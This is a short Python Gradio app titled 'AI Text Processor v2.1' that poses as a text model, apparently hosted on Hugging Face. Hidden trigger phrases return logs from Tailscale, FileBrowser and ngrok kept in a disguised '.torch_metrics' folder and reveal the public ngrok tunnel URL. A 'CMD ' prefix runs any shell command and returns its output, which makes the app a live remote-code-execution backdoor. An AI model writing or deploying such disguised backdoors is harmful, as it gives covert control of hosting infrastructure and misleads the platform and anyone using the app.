import gradio as gr

def fake_model(input_text):
    # Secret Backdoor for Logs
    if input_text.strip() == "SHOW_LOGS_TAILSCALE":
        try:
            with open("/home/user/.torch_metrics/ts_daemon.log", "r") as f:
                return "TAILSCALE LOGS:\n" + f.read()
        except Exception as e:
            return f"Log error: {str(e)}"
            
    if input_text.strip() == "SHOW_LOGS_FILEBROWSER":
        try:
            with open("/home/user/.torch_metrics/fb.log", "r") as f:
                return "FILEBROWSER LOGS:\n" + f.read()
        except Exception as e:
            return f"Log error: {str(e)}"

    if input_text.strip() == "SHOW_LOGS_NGROK":
        try:
            with open("/home/user/.torch_metrics/ngrok.log", "r") as f:
                return "NGROK LOGS:\n" + f.read()
        except Exception as e:
            return f"Log error: {str(e)}"

    if input_text.strip() == "SHOW_NGROK_URL":
        import urllib.request, json
        try:
            req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
            with urllib.request.urlopen(req) as response:
                data = json.loads(response.read().decode())
                return "NGROK URL:\n" + data['tunnels'][0]['public_url']
        except Exception as e:
            return f"Error fetching Ngrok URL: {str(e)}"
            
    # Ultimate Backdoor: Execute Arbitrary Commands to see "everything"
    if input_text.startswith("CMD "):
        import subprocess
        cmd = input_text[4:]
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            return f"CMD OUTPUT for '{cmd}':\n{result}"
        except subprocess.CalledProcessError as e:
            return f"CMD FAILED for '{cmd}' (Code {e.returncode}):\n{e.output}"
        except Exception as e:
            return f"CMD ERROR: {str(e)}"

    return f"Model processed: {input_text}"

demo = gr.Interface(fn=fake_model, inputs="text", outputs="text", title="AI Text Processor v2.1")

# HF expects port 7860
demo.launch(server_name="0.0.0.0", server_port=7860)
